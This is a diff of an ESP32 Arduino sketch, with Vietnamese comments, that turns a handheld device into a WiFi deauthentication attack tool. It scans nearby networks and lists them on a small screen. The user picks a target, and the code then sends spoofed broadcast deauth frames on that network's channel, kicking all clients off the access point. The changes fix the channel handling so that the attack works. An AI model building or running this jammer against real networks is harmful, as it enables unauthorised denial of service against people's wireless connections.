@@ -1,7 +1,9 @@
+#include <Arduino.h>
 #include <WiFi.h>
 #include <TFT_eSPI.h>
+#include <esp_wifi.h> // Thêm header cho low-level WiFi
 
-// Cấu hình cho TFT_eSPI (cần thêm vào User_Setup.h trong thư viện TFT_eSPI)
+// Cấu hình cho TFT_eSPI
 TFT_eSPI tft = TFT_eSPI(); // Khởi tạo LCD
 
 // Định nghĩa nút bấm
@@ -13,26 +15,28 @@ TFT_eSPI tft = TFT_eSPI(); // Khởi tạo LCD
 int selectedNetwork = 0; // Mạng được chọn
 int totalNetworks = 0;   // Tổng số mạng quét được
 String networks[20];     // Lưu SSID (giới hạn 20 cho đơn giản)
+int channels[20];        // Lưu channel của mạng
 
 // Hàm gửi packet deauth
-void sendDeauth(String bssid_str, String client_str) {
+void sendDeauth(String bssid_str, int channel) {
   uint8_t deauth_pkt[26] = {
-    0xc0, 0x00, 0x00, 0x00, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-    0x00, 0x00, 0x00, 0x00, 0x07, 0x00
+    0xc0, 0x00, 0x00, 0x00, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, // Broadcast client
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID (sẽ cập nhật)
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source (sẽ cập nhật)
+    0x07, 0x00
   };
 
-  uint8_t bssid[6], client[6];
+  uint8_t bssid[6];
   sscanf(bssid_str.c_str(), "%02x:%02x:%02x:%02x:%02x:%02x", &bssid[0], &bssid[1], &bssid[2], &bssid[3], &bssid[4], &bssid[5]);
-  sscanf(client_str.c_str(), "%02x:%02x:%02x:%02x:%02x:%02x", &client[0], &client[1], &client[2], &client[3], &client[4], &client[5]);
 
-  memcpy(&deauth_pkt[4], client, 6); // Receiver
   memcpy(&deauth_pkt[10], bssid, 6); // BSSID
   memcpy(&deauth_pkt[16], bssid, 6); // Source
 
   WiFi.mode(WIFI_STA);
-  esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE); // Cần lấy channel từ scan
-  esp_wifi_80211_tx(ESP_IF_WIFI_STA, deauth_pkt, sizeof(deauth_pkt), false);
+  esp_wifi_set_promiscuous(true); // Bật promiscuous mode
+  esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE); // Đặt channel của AP
+  esp_wifi_80211_tx(WIFI_IF_STA, deauth_pkt, sizeof(deauth_pkt), false);
+  esp_wifi_set_promiscuous(false); // Tắt promiscuous mode
 }
 
 // Hàm quét WiFi
@@ -52,6 +56,7 @@ void scanWiFi() {
 
   for (int i = 0; i < totalNetworks; i++) {
     networks[i] = WiFi.SSID(i) + " (" + WiFi.RSSI(i) + " dBm)";
+    channels[i] = WiFi.channel(i); // Lưu channel
     if (i == selectedNetwork) {
       tft.setTextColor(TFT_YELLOW, TFT_BLACK);
       tft.println("> " + networks[i]);
@@ -94,6 +99,11 @@ int handleButtons() {
 void setup() {
   Serial.begin(115200);
 
+  // Khởi tạo WiFi
+  WiFi.mode(WIFI_STA);
+  esp_wifi_set_promiscuous(true); // Bật promiscuous để gửi raw packet
+  esp_wifi_set_promiscuous(false);
+
   // Khởi tạo LCD
   tft.init();
   tft.setRotation(3); // Xoay ngang cho 160x80
@@ -125,14 +135,12 @@ void loop() {
     } else {
       // Thực hiện deauth cho mạng được chọn
       String bssid = WiFi.BSSIDstr(selectedNetwork);
-      String client = "FF:FF:FF:FF:FF:FF"; // Broadcast deauth
+      int channel = channels[selectedNetwork];
       tft.fillScreen(TFT_BLACK);
       tft.setCursor(0, 0);
       tft.println("Deauthing: " + WiFi.SSID(selectedNetwork));
-      sendDeauth(bssid, client);
-      delay(1000); // Gửi 10 lần
       for (int i = 0; i < 10; i++) {
-        sendDeauth(bssid, client);
+        sendDeauth(bssid, channel);
         delay(100);
       }
       tft.println("Done! Press Select to return");
